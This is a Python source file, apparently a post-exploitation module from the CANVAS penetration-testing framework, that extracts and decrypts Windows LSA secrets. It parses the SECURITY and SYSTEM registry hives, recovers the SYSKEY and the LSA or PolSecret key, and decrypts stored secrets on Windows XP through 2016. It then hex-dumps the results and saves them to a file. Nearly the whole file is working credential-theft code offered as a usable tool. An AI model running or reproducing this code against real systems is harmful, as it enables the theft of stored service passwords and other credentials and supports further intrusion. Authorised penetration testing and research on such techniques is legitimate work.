#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  lsadump.py
## Description:
##            :
## Created_On :  Wed Jan 2 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import struct
import getopt
import datetime
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

from localNode import localNode
from engine.config import canvas_root_directory
from ExploitTypes.localexploit import LocalExploit
from canvaserror import NodeCommandError
from exploitutils import *
from ExploitTypes.localcommand import LocalCommand

NAME                            = "lsadump"
DESCRIPTION                     = "Extracts the so called LSA secrets out of the SECURITY and SYSTEM hives."

DOCUMENTATION                   = {}
DOCUMENTATION["Notes"]          = """
Tested on:
    - Windows XP
    - Windows 7
    - Windows 2008
    - Windows 2012
    - Windows 2016

Written using algorithms detailled at:
a) https://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html (XP only)
b) https://www.passcape.com/index.php?section=docsys&cmd=details&id=23 (7 and later)

This module is similar to:
- lsadump: https://github.com/moyix/creddump (XP version only)
- mimikatz (lsadump::secrets): https://github.com/gentilkiwi/mimikatz
- quarkspwdump: https://github.com/quarkslab/quarkspwdump

Important: The current weakness of the modules lies in the parsing of PolEkList
(Windows 7 and above). Indeed it theoretically keeps a list of a number of keys 
while we assume that this list contains a single element. Practically it seems
work fine but may become a hindrance in the future.
"""

VERSION             = "1.0"
PROPERTY            = {}
PROPERTY['TYPE']    = 'Commands'
PROPERTY['SITE']    = 'Local'
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ 'XP', '7', '2008', '2012', '2016' ]

# Necessary to import & decrypt the hashes.
import libs.libwincreds.libwincreds as libwincreds
import libs.libwinreg.libwinreg as libwinreg

SYSTEM_CONTROL_LSA_PATH  = '\\ControlSet%03d\\Control\\Lsa'
POLICY_POLSECENCKEY_PATH = '\\Policy\\PolSecretEncryptionKey'
POLICY_POLSECS_PATH      = '\\Policy\\Secrets'
POLICY_POLEKLIST_PATH    = '\\Policy\\PolEKList'
SELECT_PATH              = '\\Select'
POLICY_PATH              = '\\Policy'
ENCVAL_HDR_SIZE          = 12

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result                 = []
        self.name                   = NAME
        # Args
        self.savefile               = "lsa_secrets.txt"
        self.security_file          = ''
        self.system_file            = ''
        self.verbose                = False    # If enabled adds extra logs
        # Globals
        self.security_parser        = None
        self.system_parser          = None
        self.is_windows_xp          = False
        self.syskey                 = ''
        self.polsecretkey           = ''       # Windows XP/2003 and below 
        self.lsakey                 = ''       # Windows 7/2008 and after
        self.secrets                = []
        self.log                    = ''


    def getargs(self):
        """
        Parsing of CLI/GUI arguments.
        """

        self.savefile = self.argsDict.get("savefile", self.savefile)
        self.security_file = self.argsDict.get("security_file", self.security_file)
        self.system_file = self.argsDict.get("system_file", self.system_file)
        self.verbose = bool(self.argsDict.get("verbose", self.verbose))

        if not self.security_file or not self.system_file:
            logging.error('You must specify both paths')
            return 0

        try:
            self.security_parser = libwinreg.WinRegParser(self.security_file)
            self.system_parser = libwinreg.WinRegParser(self.system_file)
        except Exception as e:
            logging.error('Could not initialize the reg parsers: %s' % str(e))
            return 0
        
        if self.verbose:
            logging.info('Enabling extra debug logs')
            self.set_debug_mode()

        return 1

    ###
    # Debug API
    ###

    def set_debug_mode(self):
        """
        Adds some local verbosity.
        """

        logger = logging.getLogger()
        logger.setLevel(logging.DEBUG)

    def unset_debug_mode(self):
        """
        Removes local verbosity.
        """

        logger = logging.getLogger()
        logger.setLevel(logging.INFO)

    ###
    # Registry / Secrets - Common API
    ###

    def get_policy_keys(self):
        """
        Retrieves the list of subkeys below HKLM\\Security\\Policy.
        """

        cell_policy = self.security_parser.get_keynode_by_name(POLICY_PATH)
        if not cell_policy:
            logging.error('Could not open HKLM\\Security%s!' % POLICY_PATH)
            return []

        return self.security_parser.get_subkeys(cell_policy.get_data())


    def is_windows_xp_or_below(self):
        """
        This functions returns True if it detects that the registry hives contain
        names of registry keys from Windows XP or below.
        """

        polsecretenckey_detected = False
        poleklist_detected = False

        for subk in self.policy_keys:
            subk_name = subk.get_data().get_keyname()
            if subk_name == 'PolSecretEncryptionKey':
                polsecretenckey_detected = True
            if subk_name == 'PolEKList':
                poleklist_detected = True

        if polsecretenckey_detected and poleklist_detected:
            warn_msg  = 'polsecretenckey_detected and poleklist_detected are both True.'
            warn_msg += ' This should _not_ happen, someone might be trying to fool us!'
            warn_msg += ' Assuming Windows 7 and above.'
            logging.warning(warn_msg)
            return False

        if polsecretenckey_detected:
            logging.debug('Windows XP or below was detected')
            return True

        if poleklist_detected:
            logging.debug('Windows 7 or above was detected')
            return False


    def get_control_index(self):
        """
        Returns the interger value within \\Select\\Current
        """

        try:
            cell_select = self.system_parser.get_keynode_by_name(SELECT_PATH)
            if not cell_select:
                logging.error('Could not open HKLM\\System%s!' % SELECT_PATH)
                return -1

            current_cell = self.system_parser.get_keyvalue_by_name(cell_select.get_data(), 'Current')
            current_data = self.system_parser.get_rawdata_from_keyvalue(current_cell.get_data())
            return struct.unpack('<L', current_data)[0]

        except Exception as e:
            logging.warning('get_control_index() encountered a parsing error, this might not be fatal: %s', str(e))
            return -1


    def get_syskey(self, idx_control):
        """
        Retrieves the SYSKEY.
        """

        try:

            classes = {}
            control_path = SYSTEM_CONTROL_LSA_PATH % idx_control
            cell_lsa = self.system_parser.get_keynode_by_name(control_path)
            if not cell_lsa:
                logging.error('Could not open HKLM\\System%s!' % control_path)
                return

            lsa_subkeys = self.system_parser.get_subkeys(cell_lsa.get_data())
            for subkey in lsa_subkeys:
                if subkey.get_data().get_keyname() in [ 'JD', 'Skew1', 'GBG', 'Data' ]:
                    class_data = self.system_parser.get_class_from_keynode(subkey.get_data())
                    classes[subkey.get_data().get_keyname()] = class_data.decode('utf-16-le').decode('hex')

            self.syskey = libwincreds.ExtractSysKey(classes['JD'],
                                                    classes['Skew1'],
                                                    classes['GBG'],
                                                    classes['Data'])

        except Exception as e:
            logging.error('get_syskey() failed: %s' % str(e))


    def get_encrypted_secrets(self):
        """
        Retrieves a list of values stored in HKLM\\Security\\Policy\\Secrets'.
        """

        try:
            cell_secret = self.security_parser.get_keynode_by_name(POLICY_POLSECS_PATH)
            if not cell_secret:
                logging.error('Could not open HKLM\\Security%s!' % POLICY_POLSECS_PATH)
                return 0

            secrets_subkeys = self.security_parser.get_subkeys(cell_secret.get_data())

            for subk in secrets_subkeys:

                subk_name = subk.get_data().get_keyname()
                cell_currval = self.security_parser.get_keynode_by_name('%s\\%s\\CurrVal' % (POLICY_POLSECS_PATH, subk_name))
                cell_currval_values = self.security_parser.get_values(cell_currval.get_data())

                if len(cell_currval_values) != 1:
                    logging.warning('cell_currval_values: More than one value, this is suspicious!')

                cell_value = self.security_parser.get_rawdata_from_keyvalue(cell_currval_values[0].get_data())
                logging.debug('Extracted %s for key %s' % (cell_value.encode('hex'),subk_name))
                secret = {}
                secret['name'] = subk_name
                secret['raw'] = cell_value
                self.secrets.append(secret)

            return 1

        except Exception as e:
            logging.error('An error occured during the parsing of HKLM\\Security%s!' % POLICY_POLSECS_PATH)
            return 0

    ###
    # Registry / Secrets - Windows XP and below specific API
    ###

    def get_polsecret_key(self):
        """
        Retrieves the (then encrypted) polsecret encryption/decryption key out of
        HKLM\\Security\\Policy\\PolSecretEncryptionKey. The key is then decrypted.
        """

        cell_polsec = self.security_parser.get_keynode_by_name(POLICY_POLSECENCKEY_PATH)
        if not cell_polsec:
            logging.error('Could not open %s!' % POLICY_POLSECENCKEY_PATH)
            return 0

        cell_polsec_values = self.security_parser.get_values(cell_polsec.get_data())

        if len(cell_polsec_values) != 1:
            logging.warning('cell_polsec_values: More than one value, this is suspicious!')

        encrypted_polsecretkey = self.security_parser.get_rawdata_from_keyvalue(cell_polsec_values[0].get_data())
        if not encrypted_polsecretkey:
            logging.error('Could not extract correctly the encrypted polsecretkey!')
            return 0

        self.polsecretkey = libwincreds.DecryptPolSecretEncryptionKey(encrypted_polsecretkey, self.syskey)
        logging.debug('polsecretkey: %s' % self.polsecretkey.encode('hex'))
        return 1


    def decrypt_secrets_for_XP(self):
        """
        Parses and decrypts all the encrypted secrets stored within self.secrets
        using libwincreds.DecryptPolSecret().
        """

        try:

            for secret in self.secrets:

                subk_name = secret['name']
                cell_value = secret['raw']

                # If we have no more than just metadata we skip it.
                if len(cell_value) == ENCVAL_HDR_SIZE:
                    logging.info('Key %s has an empty value, skipping!' % subk_name)
                    continue

                if len(cell_value) < ENCVAL_HDR_SIZE:
                    logging.warning('Key %s has a broken record (%d < 12)! Dropping!' % (subk_name, len(cell_value)))
                    continue

                cell_value_length = struct.unpack('<L', cell_value[:4])[0]
                cell_value_data = cell_value[ENCVAL_HDR_SIZE:]

                if len(cell_value_data) != cell_value_length:
                    logging.warning('Key %s has a broken record (%d != %d)! Dropping!' % (subk_name, len(cell_value_data), cell_value_length))
                    continue

                if len(cell_value_data) % 8:
                    logging.warning('Key %s has a broken record (not an exact number of blocks)! Dropping!' % subk_name)
                    continue

                # Decrypt the secret using the decrypted polsecretkey
                cleartext = libwincreds.DecryptPolSecret(cell_value_data, self.polsecretkey)
                if not cleartext:
                    logging.info('Key %s has an empty decrypted value!' % subk_name)

                secret['encrypted_value'] = cell_value_data
                secret['decrypted_value'] = cleartext

            return 1

        except Exception as e:
            # Something occured, possibly within libwincreds.DecryptPolSecret()?
            return 0


    ###
    # Registry / Secrets - Windows 7 and after specific API.
    ###

    def get_lsakey(self):
        """
        Retrieves the (then encrypted) lsakey out of HKLM\\Security\\Policy\\PolEkList.
        Note: PolEkList (theoretically) keeps a list of keys but practically it seems
              to keep only one. This may later be a problem!
        """

        try:
            cell_poeklist = self.security_parser.get_keynode_by_name(POLICY_POLEKLIST_PATH)
            if not cell_poeklist:
                logging.error('Could not open %s!' % POLICY_POLEKLIST_PATH)
                return 0

            cell_poeklist_values = self.security_parser.get_values(cell_poeklist.get_data())
            if not cell_poeklist_values or not len(cell_poeklist_values):
                logging.error('Could not read values from %s!' % POLICY_POLEKLIST_PATH)
                return 0

            encrypted_poeklist = self.security_parser.get_rawdata_from_keyvalue(cell_poeklist_values[0].get_data())
            if not encrypted_poeklist or not len(encrypted_poeklist):
                logging.error('Could not read values from %s!' % POLICY_POLEKLIST_PATH)
                return 0

            version = struct.unpack('>L', encrypted_poeklist[:4])[0]
            key_id, enc_id, dec_flags = struct.unpack('<16sLL', encrypted_poeklist[4:28])
            session_key = encrypted_poeklist[28:28+32]
            encrypted_data = encrypted_poeklist[60:]

            logging.debug('%s: Version:%d, Algorithm:%d, Flags:%x, KeyID:%s' % ('PolEkList', version, enc_id, dec_flags, key_id.encode('hex')))
            logging.debug('%s: SessionKey:%s' % ('PolEkList', session_key.encode('hex')))
            logging.debug('%s: Encrypted data: %s' % ('PolEkList', encrypted_data.encode('hex')))

            data = libwincreds.LsaEncryptDecrypt(encrypted_data, self.syskey, session_key, 1000)
            if not data:
                logging.error('LsaEncryptDecrypt() returned an empty string!')
                return 0

            self.lsakey = data[68:68+32]
            logging.debug('LsaKey: %s' % self.lsakey.encode('hex'))

            return 1

        except Exception as e:
            logging.error('An exception occured while attempting to retrieve the LSAkey') 
            return 0

    def decrypt_secrets_for_7(self):
        """
        Parses and decrypts all the encrypted secrets stored within self.secrets
        using libwincreds.LsaEncryptDecrypt().
        """

        try:
            for secret in self.secrets:

                subk_name = secret['name']
                cell_value = secret['raw']
                secret['encrypted_value'] = ''
                secret['decrypted_value'] = ''

                try:
                    version = struct.unpack('>L', cell_value[:4])[0]
                    key_id, enc_id, dec_flags = struct.unpack('<16sLL', cell_value[4:28])
                    session_key = cell_value[28:28+32]
                    encrypted_data = cell_value[60:]
                    logging.debug('%s: Version:%d, Algorithm:%d, Flags:%x, KeyID:%s' % (subk_name, version, enc_id, dec_flags, key_id.encode('hex')))
                    logging.debug('%s: SessionKey:%s' % (subk_name, session_key.encode('hex')))
                    logging.debug('%s: Encrypted data: %s' % (subk_name, encrypted_data.encode('hex')))
                except Exception as e:
                    logging.warn('%s: Parsing error before decryption! Skipping.' % subk_name)
                    continue

                raw_data = libwincreds.LsaEncryptDecrypt(encrypted_data, self.lsakey, session_key, 1000)

                try:
                    data_length = struct.unpack('<L', raw_data[:4])[0]
                    if not data_length or len(raw_data) == 16:
                        logging.info('Key %s has an empty decrypted value!' % subk_name)

                    decrypted_data = ''
                    if len(raw_data) > 16:
                        decrypted_data = raw_data[16:16+data_length]

                    logging.debug('%s: Length=%d, data:%s' % (subk_name, data_length, decrypted_data.encode('hex')))
                except Exception as e:
                    logging.warn('%s: Parsing error after decryption! Skipping.' % subk_name)
                    continue

                secret['encrypted_value'] = encrypted_data
                secret['decrypted_value'] = decrypted_data

            return 1

        except Exception as e:
            # Something occured, possibly within libwincreds.LsaEncryptDecrypt()?
            return 0


    ###
    # Logging / Saving API
    ###

    def display_raw_secret(self, secret):
        """
        Returns the raw secret log.
        """

        # Sanity check
        if not secret.has_key('name') or not secret.has_key('decrypted_value'):
            logging.error('Invalid secret dictionary passed to display_raw_secret()!')
            return ''

        # We mimic somehow the style of creddump.py
        log = '%s\n' % secret['name']
        data = secret['decrypted_value']

        if not data:
            log += "  [ EMPTY ]\n"
        else:
            for i in xrange(len(data) / 16):
                log += '%.4x  ' % (16*i)
                for j in xrange(16):
                    log += '%.2x ' % ord(data[16*i+j])
                log += '\n'

            offset = len(data)-(len(data) % 16)
            if len(data) % 16:
                log += '%.4x  ' % (offset)
                for b in data[offset:]:
                    log += '%.2x ' % ord(b)
                log += '\n'
        return log

    def dump_secrets(self):
        """
        Displays the hexdump version of the secrets.
        """

        for secret in self.secrets:
            logging.info(self.display_raw_secret(secret))

    def save_secrets(self):
        """
        Saves the hashes within a file.
        """

        # We may need to save these credentials
        save_loc = os.path.join(self.savepath, self.savefile)

        try:
            for secret in self.secrets:
                self.log += '%s\t%s\n' % (secret['name'], secret['decrypted_value'].encode('hex'))
            fd = open(save_loc,"ab")
            fd.write(self.log)
            fd.close()
        except Exception as e:
            logging.warning('Could not save the secrets in %s' % save_loc)
        else:
            logging.info("Saved secrets in: %s" % save_loc)

    def save_results(self):
        """
        Saves the important results from this module for any caller.
        """

        for secret in self.secrets:
            del secret['raw']
            del secret['encrypted_value']
            self.result += [ secret ]


    ###
    # The main functions
    ###

    def exploit_winXP(self):
        """
        Handles the logic of the exploit for Windows XP/2003 and below.
        """

        if not self.get_polsecret_key():
            return 0

        if not self.get_encrypted_secrets():
            return 0

        if not self.decrypt_secrets_for_XP():
            return 0

        return 1


    def exploit_post_winXP(self):
        """
        Handles the logic of the exploit for Windows 7/2008 and after.
        """

        if not self.get_encrypted_secrets():
            return 0

        if not self.get_lsakey():
            return 0

        if not self.decrypt_secrets_for_7():
            return 0

        return 1


    def run(self):
        """
        The entry point.
        """

        self.setInfo("%s" % NAME)
        if not self.getargs():
            return 0

        # We need a directory to save results
        self.savepath = self.output(subdir="PasswordHashes")

        idx_ctrl = self.get_control_index()
        if idx_ctrl == -1:
            logging.warning('Could not retrieve the control index, assuming 1 just in case.')
            idx_ctrl = 1

        self.get_syskey(idx_ctrl)
        if not self.syskey:
            logging.error('Could not retrieve the SYSKEY')
            return 0

        logging.info('Successfully retrieved the syskey')
        logging.debug('syskey: %s' % self.syskey.encode('hex'))

        self.policy_keys = self.get_policy_keys()
        if not self.policy_keys:
            logging.error('Could not retrieve the policy keys, something is very wrong!')
            return 0

        self.is_windows_xp = self.is_windows_xp_or_below()

        if self.is_windows_xp:
            ret = self.exploit_winXP()
        else:
            ret = self.exploit_post_winXP()

        # If we had an error returned at that point then it is a complete failure.
        if not ret:
            self.setInfo("%s - done (failed)" % (NAME))
            return 0

        if self.verbose:
            self.unset_debug_mode()

        # Otherwise we proceed with the dumping of the secrets in the console and
        # we save them within a file (self.savefile)
        self.dump_secrets()
        self.save_secrets()
        self.save_results()

        self.setProgress(100)
        nr_secrets_revealed = len([secret for secret in self.secrets if len(secret['decrypted_value'])])
        self.setInfo("%s - done (success: %s)" % (NAME, "%d secrets found" % nr_secrets_revealed))
        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
